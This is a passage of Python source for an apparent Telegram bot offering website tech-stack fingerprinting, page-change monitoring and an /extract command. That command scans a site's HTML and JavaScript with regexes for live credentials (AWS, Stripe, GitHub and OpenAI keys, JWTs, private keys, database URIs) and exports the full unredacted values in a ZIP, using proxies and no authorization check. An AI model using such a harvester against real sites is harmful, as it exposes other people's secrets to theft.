    "Caddy":                 [r'server:\s*caddy'],
    "LiteSpeed":             [r'server:\s*litespeed'],
    "IIS (Microsoft)":       [r'server:\s*microsoft-iis'],
    "OpenResty":             [r'server:\s*openresty'],
    "Gunicorn":              [r'server:\s*gunicorn'],
    "uWSGI":                 [r'server:\s*uwsgi'],
    "Kestrel (.NET)":        [r'server:\s*kestrel'],
    "Tomcat":                [r'server:\s*apache-coyote', r'apache tomcat'],
    # ── CDN / WAF ────────────────────────────────────
    "Cloudflare":            [r'cf-ray', r'server:\s*cloudflare', r'__cf_bm'],
    "Cloudflare WAF":        [r'cf-mitigated', r'cloudflare-nginx'],
    "Akamai":                [r'x-akamai-request-id', r'akamai\.net'],
    "Fastly":                [r'x-fastly-request-id', r'fastly\.net'],
    "AWS CloudFront":        [r'x-amz-cf-id', r'cloudfront\.net'],
    "AWS ALB":               [r'x-amzn-requestid', r'x-amzn-trace-id'],
    "Vercel":                [r'x-vercel-id', r'vercel\.app'],
    "Netlify":               [r'x-nf-request-id', r'netlify\.app'],
    "Render":                [r'rndr-id', r'onrender\.com'],
    "Railway":               [r'railway\.app'],
    "Heroku":                [r'x-request-id.*heroku', r'herokuapp\.com'],
    "Sucuri WAF":            [r'x-sucuri-id', r'sucuri\.net'],
    "Imperva/Incapsula":     [r'x-iinfo', r'incapsula', r'visid_incap_'],
    "Varnish":               [r'x-varnish', r'via.*varnish'],
    "BunnyCDN":              [r'bunnycdn', r'b-cdn\.net'],
    # ── Analytics / Marketing ────────────────────────
    "Google Analytics 4":    [r'G-[A-Z0-9]{8,12}', r'gtag\('],
    "Google Analytics UA":   [r'UA-\d{5,12}-\d', r'google-analytics\.com'],
    "Google Tag Manager":    [r'GTM-[A-Z0-9]+', r'googletagmanager\.com/gtm\.js'],
    "Google Ads":                 (r"\b(AW-\d{8,12})\b", "📊"),
    "Hotjar":                [r'hotjar\.com', r'hjid'],
    "Mixpanel":              [r'mixpanel\.init', r'mixpanel\.com/lib'],
    "Amplitude":             [r'amplitude\.getInstance', r'cdn\.amplitude\.com'],
    "Heap":                  [r'heap\.load', r'heapanalytics\.com'],
    "Segment":               [r'analytics\.load', r'cdn\.segment\.com'],
    "Facebook Pixel":        [r'fbq\(', r'connect\.facebook\.net/en_US/fbevents'],
    "TikTok Pixel":               (r"ttq\.load.{0,10}([A-Z0-9]{15,20})", "📱"),
    "LinkedIn Insight":      [r'snap\.licdn\.com', r'_linkedin_partner_id'],
    "Clarity (Microsoft)":   [r'clarity\.ms', r'clarity\('],
    "FullStory":             [r'fullstory\.com/s/fs\.js'],
    # ── Live Chat ────────────────────────────────────
    "Intercom":              [r'intercom\.io', r'widget\.intercom\.io'],
    "HubSpot Chat":          [r'js\.hs-scripts\.com', r'hubspot\.com/hs/'],
    "Drift":                 [r'js\.drift\.com', r'driftt\.com'],
    "Zendesk":               [r'zopim', r'zendesk\.com/embeddable'],
    "Crisp":                 [r'crisp\.chat', r'client\.crisp\.chat'],
    "Tawk.to":               [r'tawk\.to', r'embed\.tawk\.to'],
    "Freshchat":             [r'wchat\.freshchat\.com'],
    # ── Backend / Language ───────────────────────────
    "PHP":                   [r'x-powered-by:\s*php', r'\.php\b', r'PHPSESSID'],
    "Laravel":               [r'laravel_session', r'laravel_token', r'XSRF-TOKEN'],
    "Symfony":               [r'symfony', r'_symfony_'],
    "CakePHP":               [r'cakephp', r'CAKEPHP'],
    "CodeIgniter":           [r'ci_session', r'codeigniter'],
    "Django":                [r'csrfmiddlewaretoken', r'django'],
    "Flask":                 [r'werkzeug', r'flask-session'],
    "FastAPI":               [r'fastapi'],
    "Rails":                 [r'_rails_', r'authenticity_token', r'rails-ujs'],
    "ASP.NET":               [r'x-powered-by:\s*asp\.net', r'__viewstate', r'__eventvalidation'],
    "ASP.NET Core":          [r'x-powered-by:\s*asp\.net core', r'\.blazor'],
    "Spring (Java)":         [r'x-application-context', r'spring'],
    "Go (Gin/Echo)":         [r'server:\s*gin', r'server:\s*echo'],
    "Node.js":               [r'x-powered-by:\s*node', r'connect\.sid'],
    "Express.js":            [r'x-powered-by:\s*express'],
    "NestJS":                [r'nestjs'],
    ".NET Blazor":           [r'_blazor', r'blazor\.webassembly'],
    # ── Auth / Identity ──────────────────────────────
    "Auth0":                 [r'auth0\.com', r'auth0\.js'],
    "Okta":                  [r'okta\.com', r'okta-signin'],
    "Firebase Auth":         [r'firebase\.auth\(\)', r'firebaseapp\.com'],
    "Keycloak":              [r'keycloak\.js', r'/auth/realms/'],
    "Clerk":                 [r'clerk\.dev', r'clerk\.browser\.js'],
    "Supabase":              [r'supabase\.co', r'supabaseClient'],
    # ── Payment ──────────────────────────────────────
    "Stripe":                [r'stripe\.com/v3', r'Stripe\(', r'js\.stripe\.com'],
    "PayPal":                [r'paypal\.com/sdk', r'paypalobjects\.com'],
    "Braintree":             [r'braintreegateway\.com', r'Braintree\.setup'],
    "Square":                [r'squareup\.com', r'Square\.paymentForm'],
    "Razorpay":              [r'razorpay\.com', r'Razorpay\('],
    # ── Captcha ──────────────────────────────────────
    "reCAPTCHA":             [r'recaptcha/api\.js', r'g-recaptcha'],
    "hCaptcha":              [r'hcaptcha\.com/1/api\.js', r'h-captcha'],
    "Cloudflare Turnstile":  [r'challenges\.cloudflare\.com', r'cf-turnstile'],
    # ── Monitoring ───────────────────────────────────
    "Sentry":                [r'sentry\.io', r'sentry\.min\.js', r'Sentry\.init'],
    "Datadog RUM":           [r'datadoghq\.com', r'datadog-rum'],
    "New Relic":             [r'newrelic\.com', r'nr-data\.net'],
    # ── Services / APIs ──────────────────────────────
    "GraphQL":               [r'/graphql', r'__typename', r'IntrospectionQuery'],
    "Apollo GraphQL":        [r'apollo-client', r'ApolloClient'],
    "Prisma":                [r'prisma\.io', r'@prisma/client'],
    "Socket.io":             [r'socket\.io/socket\.io\.js'],
    "Firebase":              [r'firebaseapp\.com', r'firebase\.initializeApp'],
    "Supabase DB":           [r'supabase\.co', r'supabaseClient'],
    "Elasticsearch":         [r'x-elastic-product', r'elastic\.co'],
    "Pusher":                [r'pusher\.com', r'pusherapp\.com'],
    "Twilio":                [r'twilio\.com', r'twilio\.js'],
    "Cloudinary":            [r'res\.cloudinary\.com', r'cloudinary\.com/video'],
    "Swagger UI":            [r'swagger-ui', r'swaggerUi'],
    # ── Build Tools ──────────────────────────────────
    "Webpack":               [r'webpackChunk', r'__webpack_require__'],
    "Vite":                  [r'/@vite/', r'vite/client'],
    "PWA":                   [r'serviceWorker\.register', r'workbox-'],
    "tRPC":                  [r'trpc\.io', r'@trpc/'],
}

_TECH_CATEGORY = {
    "CMS":              ["WordPress","WordPress+WooCommerce","Drupal","Joomla","Ghost CMS",
                         "Shopify","Magento","Prestashop","OpenCart","TYPO3","Wix",
                         "Squarespace","Webflow","Contentful","Strapi","Craft CMS",
                         "HubSpot CMS","Sitecore","Umbraco"],
    "JS Frameworks":    ["Next.js","Nuxt.js","React","Vue.js","Angular","Svelte","Gatsby",
                         "Remix","Astro","SvelteKit","Ember.js","Alpine.js","HTMX",
                         "Stimulus","Inertia.js"],
    "JS Libraries":     ["jQuery","Bootstrap","Tailwind CSS","Lodash","Axios","D3.js","Chart.js"],
    "Backend":          ["PHP","Laravel","Symfony","CakePHP","CodeIgniter","Django","Flask",
                         "FastAPI","Rails","ASP.NET","ASP.NET Core","Spring (Java)","Go (Gin/Echo)",
                         "Node.js","Express.js","NestJS",".NET Blazor"],
    "Web Server":       ["Nginx","Apache","Caddy","LiteSpeed","IIS (Microsoft)","OpenResty",
                         "Gunicorn","uWSGI","Kestrel (.NET)","Tomcat"],
    "CDN / WAF":        ["Cloudflare","Cloudflare WAF","Akamai","Fastly","AWS CloudFront",
                         "AWS ALB","Vercel","Netlify","Render","Railway","Heroku",
                         "Sucuri WAF","Imperva/Incapsula","Varnish","BunnyCDN"],
    "Analytics":        ["Google Analytics 4","Google Analytics UA","Google Tag Manager",
                         "Google Ads","Hotjar","Mixpanel","Amplitude","Heap","Segment",
                         "Facebook Pixel","TikTok Pixel","LinkedIn Insight",
                         "Clarity (Microsoft)","FullStory"],
    "Live Chat":        ["Intercom","HubSpot Chat","Drift","Zendesk","Crisp","Tawk.to","Freshchat"],
    "Auth":             ["Auth0","Okta","Firebase Auth","Keycloak","Clerk","Supabase"],
    "Payment":          ["Stripe","PayPal","Braintree","Square","Razorpay"],
    "Captcha":          ["reCAPTCHA","hCaptcha","Cloudflare Turnstile"],
    "Monitoring":       ["Sentry","Datadog RUM","New Relic"],
    "Services / APIs":  ["GraphQL","Apollo GraphQL","Prisma","Socket.io","Firebase","Supabase DB",
                         "Elasticsearch","Pusher","Twilio","Cloudinary","Swagger UI","tRPC"],
    "Build Tools":      ["Webpack","Vite","PWA"],
}

_NOTABLE_HEADERS = [
    'server', 'x-powered-by', 'x-generator', 'x-framework',
    'cf-ray', 'cf-cache-status', 'via', 'x-drupal-cache', 'x-varnish',
    'x-shopify-stage', 'x-wix-request-id', 'x-vercel-id', 'x-nf-request-id',
    'x-amzn-requestid', 'x-amz-cf-id', 'x-request-id', 'x-correlation-id',
    'x-ratelimit-limit', 'x-ratelimit-remaining', 'x-frame-options',
    'content-security-policy', 'strict-transport-security', 'x-content-type-options',
    'permissions-policy', 'access-control-allow-origin', 'x-elastic-product',
    'x-application-context', 'x-aspnet-version', 'x-iinfo', 'rndr-id',
]

async def cmd_tech(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """/tech <url> — Deep technology stack fingerprinting (130+ signatures)"""
    if not context.args:
        await update.effective_message.reply_text(
            "🔬 *Tech Stack Fingerprinter v2*\n"
            "━━━━━━━━━━━━━━━━━━━━\n\n"
            "*Usage:* `/tech https://example.com/any/path`\n\n"
            f"*{len(_TECH_SIGNATURES)} signatures across:*\n"
            "  🗂 CMS (WordPress, Shopify, Drupal, Magento...)\n"
            "  ⚡ JS Frameworks (React, Next.js, Vue, Angular...)\n"
            "  🖥 Servers (Nginx, Apache, Caddy, IIS...)\n"
            "  ☁️ CDN/WAF (Cloudflare, Vercel, Akamai...)\n"
            "  📊 Analytics (GA4, GTM, Mixpanel, Hotjar...)\n"
            "  🔐 Auth (Auth0, Okta, Firebase, Clerk...)\n"
            "  💳 Payment (Stripe, PayPal, Razorpay...)\n"
            "  🔧 Backend (PHP, Django, Rails, Laravel...)\n"
            "  🧩 Services (GraphQL, Socket.io, Sentry...)\n\n"
            "📡 Also scans: HTTP headers, cookies, JS bundles",
            parse_mode='Markdown'
        )
        return

    uid = update.effective_user.id
    allowed, wait = check_rate_limit(uid)
    if not allowed:
        await update.effective_message.reply_text(f"⏳ `{wait}s` စောင့်ပါ", parse_mode='Markdown')
        return

    url = context.args[0].strip()
    if not url.startswith('http'):
        url = 'https://' + url

    safe_ok, reason = is_safe_url(url)
    if not safe_ok:
        await update.effective_message.reply_text(f"🚫 `{reason}`", parse_mode='Markdown')
        return

    domain = urlparse(url).hostname
    path   = urlparse(url).path or "/"
    msg    = await update.effective_message.reply_text(
        f"🔬 *Tech Fingerprinting...*\n🌐 `{domain}`\n📁 `{path}`\n\n⏳",
        parse_mode='Markdown'
    )

    def _do_tech_scan():
        sess = requests.Session()
        sess.headers.update(_get_headers())
        proxy = proxy_manager.get_proxy()

        # Fetch main page
        resp = sess.get(url, timeout=TIMEOUT, verify=False,
                        proxies=proxy, allow_redirects=True)
        html         = resp.text
        body_low     = html.lower()[:120000]
        hdrs         = dict(resp.headers)
        hdrs_str     = "\n".join(f"{k}: {v}" for k, v in hdrs.items()).lower()
        combined_low = body_low + "\n" + hdrs_str
        cookies_str  = " ".join(f"{c.name}={c.value}" for c in sess.cookies)
        combined_low += "\n" + cookies_str.lower()

        # Also scan linked JS bundles (first 5)
        js_corpus = ""
        soup_tech = BeautifulSoup(html, "html.parser")
        js_fetched = 0
        for tag in soup_tech.find_all("script", src=True):
            if js_fetched >= 5:
                break
            js_url = urljoin(url, tag["src"])
            try:
                jr = sess.get(js_url, timeout=8, verify=False, proxies=proxy)
                if jr.status_code == 200:
                    js_corpus += jr.text[:50000].lower()
                    js_fetched += 1
            except Exception:
                pass
        combined_low += "\n" + js_corpus

        detected = {}
        for tech, patterns in _TECH_SIGNATURES.items():
            for p in patterns:
                try:
                    if re.search(p, combined_low, re.I):
                        detected[tech] = True
                        break
                except Exception:
                    pass

        notable = {k: v for k, v in hdrs.items()
                   if k.lower() in _NOTABLE_HEADERS}
        return detected, notable, resp.status_code, resp.url, js_fetched

    try:
        detected, notable, status, final_url, js_cnt = await asyncio.to_thread(_do_tech_scan)
    except Exception as e:
        await msg.edit_text(f"❌ Error: `{type(e).__name__}: {str(e)[:80]}`",
                            parse_mode='Markdown')
        return

    # ── Build report ──────────────────────────────
    redirect_note = ""
    if str(final_url).rstrip("/") != url.rstrip("/"):
        redirect_note = f"\n↪️ Redirected: `{str(final_url)[:60]}`"

    lines = [
        f"🔬 *Tech Stack Report*",
        f"🌐 `{domain}` | `{status}`{redirect_note}",
        f"📦 Signatures: `{len(_TECH_SIGNATURES)}` | JS bundles: `{js_cnt}`",
        f"✅ Detected: `{len(detected)}` technologies",
        "━━━━━━━━━━━━━━━━━━━━",
        "",
    ]

    cat_icons = {
        "CMS": "🗂", "JS Frameworks": "⚡", "JS Libraries": "📚",
        "Backend": "🔧", "Web Server": "🖥", "CDN / WAF": "☁️",
        "Analytics": "📊", "Live Chat": "💬", "Auth": "🔐",
        "Payment": "💳", "Captcha": "🛡", "Monitoring": "👁",
        "Services / APIs": "🧩", "Build Tools": "⚙️",
    }

    any_found = False
    for cat, techs in _TECH_CATEGORY.items():
        hits = [t for t in techs if t in detected]
        if not hits:
            continue
        icon = cat_icons.get(cat, "•")
        lines.append(f"{icon} *{cat}* `({len(hits)})`")
        for h in hits:
            lines.append(f"  ✅ `{h}`")
        lines.append("")
        any_found = True

    # Any detected not in category
    all_categorised = {t for ts in _TECH_CATEGORY.values() for t in ts}
    extras = [t for t in detected if t not in all_categorised]
    if extras:
        lines.append("🔍 *Other*")
        for t in extras:
            lines.append(f"  ✅ `{t}`")
        lines.append("")
        any_found = True

    if not any_found:
        lines += [
            "⚠️ *No known signatures matched*",
            "",
            "_Site may use:_",
            "  • Custom/obscure framework",
            "  • Heavy minification/obfuscation",
            "  • Server-side rendering only",
        ]

    # Security headers check
    sec_hdrs = {
        "Strict-Transport-Security": "HSTS",
        "Content-Security-Policy": "CSP",
        "X-Frame-Options": "XFO",
        "X-Content-Type-Options": "XCTO",
        "Permissions-Policy": "Perms",
        "Referrer-Policy": "Referrer",
    }
    missing_sec = [short for full, short in sec_hdrs.items()
                   if full.lower() not in {k.lower() for k in notable}
                   and full not in notable]
    if missing_sec:
        lines.append(f"⚠️ *Missing Security Headers:* `{'  '.join(missing_sec)}`")
        lines.append("")

    # Notable headers
    if notable:
        lines.append("*📋 Key Headers:*")
        for k, v in list(notable.items())[:10]:
            lines.append(f"  `{k}`: `{v[:55]}`")

    report = "\n".join(lines)
    try:
        if len(report) <= 4000:
            await msg.edit_text(report, parse_mode='Markdown')
        else:
            await msg.edit_text(report[:4000] + "\n_...truncated_", parse_mode='Markdown')
            await update.effective_message.reply_text(report[4000:], parse_mode='Markdown')
    except Exception:
        await update.effective_message.reply_text(report[:4000], parse_mode='Markdown')


# ══════════════════════════════════════════════════
# 🔔  FEATURE 3 — /monitor  Change Detection & Alerting
# ══════════════════════════════════════════════════
# DB structure: db["monitors"][str(uid)] = [{"url":..,"interval_min":..,"last_hash":..,"last_check":..,"label":..}]

_monitor_app_ref = None   # set in main() to access app.bot

async def monitor_loop():
    """Background task — check monitored URLs for content changes every 60s."""
    global _monitor_app_ref
    while True:
        try:
            await asyncio.sleep(60)
            async with db_lock:
                db = _load_db_sync()

            changed_alerts = []  # (uid, entry, new_hash)
            now = time.time()

            for uid_str, monitors in db.get("monitors", {}).items():
                for entry in monitors:
                    interval_sec = entry.get("interval_min", 30) * 60
                    if now - entry.get("last_check", 0) < interval_sec:
                        continue
                    try:
                        resp      = requests.get(
                            entry["url"], headers=_get_headers(),
                            timeout=TIMEOUT, verify=False,
                            proxies=proxy_manager.get_proxy()
                        )
                        new_hash  = hashlib.sha256(resp.text.encode()).hexdigest()
                        old_hash  = entry.get("last_hash", "")
                        entry["last_check"] = now

                        if old_hash and old_hash != new_hash:
                            changed_alerts.append((uid_str, entry, new_hash, resp.status_code))
                        entry["last_hash"] = new_hash
                    except Exception as ex:
                        logger.debug("Monitor check error %s: %s", entry.get("url"), ex)

            async with db_lock:
                _save_db_sync(db)

            # Fire alerts
            if _monitor_app_ref and changed_alerts:
                for uid_str, entry, new_hash, status in changed_alerts:
                    try:
                        label = entry.get("label") or entry["url"][:40]
                        await _monitor_app_ref.bot.send_message(
                            chat_id=int(uid_str),
                            text=(
                                f"🔔 *Page Changed!*\n"
                                f"━━━━━━━━━━━━━━━━━━━━\n"
                                f"🏷 *{label}*\n"
                                f"🔗 `{entry['url'][:60]}`\n"
                                f"📡 Status: `{status}`\n"
                                f"🕑 {datetime.now().strftime('%Y-%m-%d %H:%M')}\n\n"
                                f"Old: `{entry.get('last_hash','?')[:16]}…`\n"
                                f"New: `{new_hash[:16]}…`\n\n"
                                f"_Use /monitor list to manage alerts_"
                            ),
                            parse_mode='Markdown'
                        )
                    except Exception as e:
                        logger.warning("Monitor alert send error: %s", e)

        except Exception as e:
            logger.error("Monitor loop error: %s", e)
            await asyncio.sleep(30)


async def cmd_monitor(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """/monitor add <url> [interval_min] [label] | list | del <n> | clear"""
    uid  = str(update.effective_user.id)
    args = context.args or []
    sub  = args[0].lower() if args else ""

    if not sub or sub == "help":
        await update.effective_message.reply_text(
            "🔔 *Page Monitor — Usage*\n\n"
            "`/monitor add <url> [interval] [label]`\n"
            "  └ interval = minutes (default 30, min 5)\n"
            "  └ label = custom name (optional)\n\n"
            "`/monitor list` — View all monitors\n"
            "`/monitor del <n>` — Remove by number\n"
            "`/monitor clear` — Remove all\n\n"
            "📣 Bot ကို alert ပို့ပေးမယ် page ပြောင်းတိုင်း",
            parse_mode='Markdown'
        )
        return

    async with db_lock:
        db = _load_db_sync()
        if "monitors" not in db:
            db["monitors"] = {}
        monitors = db["monitors"].setdefault(uid, [])

        if sub == "add":
            if len(args) < 2:
                await update.effective_message.reply_text("Usage: `/monitor add <url> [interval_min] [label]`", parse_mode='Markdown')
                _save_db_sync(db)
                return
            url   = args[1].strip()
            if not url.startswith('http'):
                url = 'https://' + url
            safe_ok, reason = is_safe_url(url)
            if not safe_ok:
                await update.effective_message.reply_text(f"🚫 `{reason}`", parse_mode='Markdown')
                _save_db_sync(db)
                return
            interval = max(5, int(args[2])) if len(args) > 2 and args[2].isdigit() else 30
            label    = " ".join(args[3:])[:40] if len(args) > 3 else urlparse(url).hostname
            if len(monitors) >= 10:
                await update.effective_message.reply_text("⚠️ Max 10 monitors per user.", parse_mode='Markdown')
                _save_db_sync(db)
                return
            monitors.append({
                "url": url, "label": label,
                "interval_min": interval,
                "last_hash": "", "last_check": 0,
                "added": datetime.now().strftime("%Y-%m-%d %H:%M")
            })
            _save_db_sync(db)
            await update.effective_message.reply_text(
                f"✅ *Monitor Added*\n"
                f"🏷 `{label}`\n🔗 `{url[:60]}`\n⏱ Every `{interval}` min",
                parse_mode='Markdown'
            )

        elif sub == "list":
            _save_db_sync(db)
            if not monitors:
                await update.effective_message.reply_text("📭 No monitors set up yet.")
                return
            lines = ["🔔 *Your Monitors*\n"]
            for i, m in enumerate(monitors, 1):
                lines.append(
                    f"*{i}.* `{m.get('label', m['url'][:30])}`\n"
                    f"   🔗 `{m['url'][:50]}`\n"
                    f"   ⏱ Every `{m['interval_min']}` min | Added `{m.get('added','?')}`"
                )
            await update.effective_message.reply_text("\n".join(lines), parse_mode='Markdown')

        elif sub == "del":
            idx = int(args[1]) - 1 if len(args) > 1 and args[1].isdigit() else -1
            if 0 <= idx < len(monitors):
                removed = monitors.pop(idx)
                _save_db_sync(db)
                await update.effective_message.reply_text(
                    f"🗑 Removed: `{removed.get('label', removed['url'][:40])}`",
                    parse_mode='Markdown'
                )
            else:
                _save_db_sync(db)
                await update.effective_message.reply_text("❌ Invalid number. Use `/monitor list` to see indexes.", parse_mode='Markdown')

        elif sub == "clear":
            monitors.clear()
            _save_db_sync(db)
            await update.effective_message.reply_text("🗑 All monitors cleared.")

        else:
            _save_db_sync(db)
            await update.effective_message.reply_text("❓ Unknown subcommand. Use `/monitor help`", parse_mode='Markdown')


# ══════════════════════════════════════════════════
# 🔑  FEATURE 7 — /extract  Secret & Sensitive Data Extractor
# ══════════════════════════════════════════════════

_SECRET_PATTERNS = {
    "AWS Access Key":    (r'AKIA[0-9A-Z]{16}',                              "🔴"),
    "AWS Secret":        (r'(?i)aws.{0,20}secret.{0,20}[0-9a-zA-Z/+]{40}', "🔴"),
    "Stripe Secret":     (r'sk_live_[0-9a-zA-Z]{24,}',                     "🔴"),
    "Stripe Public":     (r'pk_live_[0-9a-zA-Z]{24,}',                     "🟡"),
    "JWT Token":         (r'eyJ[a-zA-Z0-9_-]{10,}\.[a-zA-Z0-9_-]{10,}\.[a-zA-Z0-9_-]{10,}', "🔴"),
    "Google API Key":    (r'AIza[0-9A-Za-z_-]{35}',                        "🔴"),
    "Firebase Config":   (r'"apiKey"\s*:\s*"AIza[0-9A-Za-z_-]{35}"',       "🔴"),
    "Private Key Block": (r'-----BEGIN (?:RSA |EC )?PRIVATE KEY-----',      "🔴"),
    "GitHub Token":      (r'ghp_[0-9a-zA-Z]{36}',                          "🔴"),
    "GitLab Token":      (r'glpat-[0-9a-zA-Z_-]{20}',                      "🔴"),
    "Slack Token":       (r'xox[baprs]-[0-9a-zA-Z\-]+',                    "🔴"),
    "Bearer Token":      (r'(?i)bearer\s+[a-zA-Z0-9_\-\.]{20,}',           "🟠"),
    "Basic Auth Header": (r'(?i)authorization:\s*basic\s+[A-Za-z0-9+/=]{8,}',"🟠"),
    "MongoDB URI":       (r'mongodb(?:\+srv)?://[^\s"\'<>]{10,}',           "🔴"),
    "MySQL DSN":         (r'mysql://[^\s"\'<>]{10,}',                       "🔴"),
    "Generic Password":  (r'(?i)(?:password|passwd|pwd)\s*[=:]\s*["\'][^"\']{8,}["\']', "🟠"),
    "Telegram Token":    (r'\d{8,10}:AA[0-9a-zA-Z_-]{33}',                 "🔴"),
    "Sendgrid Key":      (r'SG\.[A-Za-z0-9_-]{22}\.[A-Za-z0-9_-]{43}',    "🔴"),
    "Twilio Key":        (r'SK[0-9a-fA-F]{32}',                             "🟠"),
    "HuggingFace Token": (r'hf_[a-zA-Z]{34}',                              "🟡"),
    "OpenAI Key":        (r'sk-[a-zA-Z0-9]{48}',                           "🔴"),
}

async def cmd_extract(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """/extract <url> — Scan HTML + JS for secrets, always exports ZIP with all sources"""
    if not context.args:
        await update.effective_message.reply_text(
            "📌 *Usage:* `/extract https://example.com`\n\n"
            "🔑 Scans HTML source + all external/inline JS files for:\n"
            "AWS keys, Stripe, JWT, GitHub tokens, Firebase configs,\n"
            "private keys, MongoDB URIs, passwords & more.\n\n"
            f"Checks `{len(_SECRET_PATTERNS)}` secret patterns across all JS bundles.\n\n"
            "📦 *Always exports a ZIP* containing:\n"
            "  • `index.html` — raw HTML source\n"
            "  • `js/` folder — all external JS files\n"
            "  • `inline_scripts/` — all inline `<script>` blocks\n"
            "  • `report.json` — full findings report\n"
            "  • `report.txt` — human-readable summary\n\n"
            "⚠️ _For authorized security research only._",
            parse_mode='Markdown'
        )
        return

    uid = update.effective_user.id
    allowed, wait = check_rate_limit(uid)
    if not allowed:
        await update.effective_message.reply_text(f"⏳ `{wait}s` စောင့်ပါ", parse_mode='Markdown')
        return

    url = context.args[0].strip()
    if not url.startswith('http'):
        url = 'https://' + url

    safe_ok, reason = is_safe_url(url)
    if not safe_ok:
        await update.effective_message.reply_text(f"🚫 `{reason}`", parse_mode='Markdown')
        return

    domain = urlparse(url).hostname

    msg = await update.effective_message.reply_text(
        f"🔑 Scanning `{domain}`...\n\n"
        "⬇️ Phase 1: Fetching HTML source\n"
        "📦 Phase 2: Downloading JS bundles\n"
        "🔍 Phase 3: Pattern matching\n"
        "🗜️ Phase 4: Building ZIP\n\n⏳",
        parse_mode='Markdown'
    )

    def _do_extract():
        session   = requests.Session()
        session.headers.update(_get_headers())

        resp = session.get(url, timeout=TIMEOUT, verify=False, allow_redirects=True)
        soup = BeautifulSoup(resp.text, 'html.parser')

        # ── Build source map ──────────────────────────────
        # sources = { filename_in_zip : content_str }
        sources        = {}
        source_origins = {}   # filename → original URL or tag info
        inline_idx     = 0
        js_idx         = 0

        # 1. Main HTML
        sources["index.html"]        = resp.text
        source_origins["index.html"] = url

        # 2. External JS + inline scripts
        for script in soup.find_all('script'):
            src = script.get('src')
            if src:
                js_url    = urljoin(url, src) if not src.startswith('http') else src
                js_safe, _ = is_safe_url(js_url)
                if not js_safe:
                    continue
                try:
                    jr = session.get(js_url, timeout=12, verify=False)
                    if jr.status_code == 200 and jr.text.strip():
                        # Make a safe filename from the URL path
                        raw_name = src.split('/')[-1].split('?')[0][:60] or f"script_{js_idx}.js"
                        # Ensure .js extension
                        if not raw_name.endswith('.js'):
                            raw_name += '.js'
                        safe_name = re.sub(r'[^\w\.\-]', '_', raw_name)
                        fname     = f"js/{js_idx:03d}_{safe_name}"
                        sources[fname]        = jr.text
                        source_origins[fname] = js_url
                        js_idx += 1
                except Exception:
                    pass
            elif script.string and script.string.strip():
                content_str = script.string.strip()
                fname       = f"inline_scripts/inline_{inline_idx:03d}.js"
                sources[fname]        = content_str[:200000]   # cap at 200KB per inline
                source_origins[fname] = f"<script> tag #{inline_idx} on {url}"
                inline_idx += 1

        # ── Scan all sources ──────────────────────────────
        findings  = []
        seen_keys = set()

        for fname, content in sources.items():
            file_findings = []
            for stype, (pattern, risk) in _SECRET_PATTERNS.items():
                for match in re.finditer(pattern, content):
                    val = match.group(0)
                    # Store FULL value in findings (goes into ZIP report, not Telegram message)
                    dedup_key = stype + val[:40]
                    if dedup_key in seen_keys:
                        continue
                    seen_keys.add(dedup_key)
                    # Redacted copy for Telegram display
                    if len(val) > 16:
                        redacted = val[:8] + "…" + val[-4:]
                    else:
                        redacted = val[:6] + "…"
                    file_findings.append({
                        "type":     stype,
                        "risk":     risk,
                        "value_redacted": redacted,
                        "value_full":     val,       # full value stored in ZIP only
                        "file":     fname,
                        "origin":   source_origins.get(fname, ""),
                        "line":     content[:match.start()].count('\n') + 1,
                    })
            findings.extend(file_findings)

        return sources, source_origins, findings

    try:
        sources, source_origins, findings = await asyncio.to_thread(_do_extract)
    except Exception as e:
        await msg.edit_text(f"❌ Error: `{type(e).__name__}: {str(e)[:80]}`", parse_mode='Markdown')
        return

    # ── Sort findings by risk ────────────────────────────
    risk_order = {"🔴": 0, "🟠": 1, "🟡": 2}
    findings.sort(key=lambda x: risk_order.get(x["risk"], 9))

    critical = sum(1 for f in findings if f["risk"] == "🔴")
    high     = sum(1 for f in findings if f["risk"] == "🟠")
    med      = sum(1 for f in findings if f["risk"] == "🟡")

    # ── Build report.txt (human readable, full values) ──
    txt_lines = [
        f"=" * 60,
        f"  EXTRACT REPORT — {domain}",
        f"  Scanned: {datetime.now().strftime('%Y-%m-%d %H:%M')}",
        f"  URL: {url}",
        f"=" * 60,
        f"",
        f"SUMMARY",
        f"-------",
        f"Sources scanned : {len(sources)} files",
        f"Patterns checked: {len(_SECRET_PATTERNS)}",
        f"Findings total  : {len(findings)}",
        f"  Critical (🔴) : {critical}",
        f"  High     (🟠) : {high}",
        f"  Medium   (🟡) : {med}",
        f"",
        f"FILES SCANNED",
        f"-------------",
    ]
    for fname, origin in source_origins.items():
        size_kb = len(sources[fname].encode('utf-8', errors='replace')) / 1024
        txt_lines.append(f"  [{size_kb:6.1f} KB]  {fname}  ←  {origin[:80]}")

    txt_lines += ["", "FINDINGS", "--------"]
    if findings:
        for i, f in enumerate(findings, 1):
            txt_lines += [
                f"",
                f"[{i:03d}] {f['risk']} {f['type']}",
                f"  File  : {f['file']}",
                f"  Line  : {f['line']}",
                f"  Origin: {f['origin'][:80]}",
                f"  Value : {f['value_full']}",    # ← FULL value in ZIP file
            ]
    else:
        txt_lines.append("  No secrets found.")

    txt_lines += [
        "",
        "=" * 60,
        "  ⚠  This report contains unredacted values.",
        "  For authorized security research only.",
        "=" * 60,
    ]
    report_txt = "\n".join(txt_lines)

    # ── Build report.json ────────────────────────────────
    report_json = json.dumps({
        "domain":          domain,
        "url":             url,
        "scanned_at":      datetime.now().isoformat(),
        "files_scanned":   list(source_origins.values()),
        "pattern_count":   len(_SECRET_PATTERNS),
        "findings_count":  len(findings),
        "summary":         {"critical": critical, "high": high, "medium": med},
        "findings": [{
            "type":   f["type"],
            "risk":   f["risk"],
            "value":  f["value_full"],
            "file":   f["file"],
            "line":   f["line"],
            "origin": f["origin"],
        } for f in findings],
        "files": {fname: source_origins[fname] for fname in sources},
    }, ensure_ascii=False, indent=2)

    # ── Build ZIP in memory ──────────────────────────────
    await msg.edit_text(
        f"🗜️ Building ZIP for `{domain}`...\n"
        f"📂 `{len(sources)}` source files + reports",
        parse_mode='Markdown'
    )

    import io
    zip_buffer = io.BytesIO()
    safe_domain = re.sub(r'[^\w\-]', '_', domain)
    ts          = datetime.now().strftime("%Y%m%d_%H%M%S")
    zip_name    = f"extract_{safe_domain}_{ts}.zip"

    with zipfile.ZipFile(zip_buffer, 'w', zipfile.ZIP_DEFLATED) as zf:
        # Source files
        for fname, content in sources.items():
            zf.writestr(f"sources/{fname}", content.encode('utf-8', errors='replace'))
        # Reports
        zf.writestr("report.txt",  report_txt.encode('utf-8'))
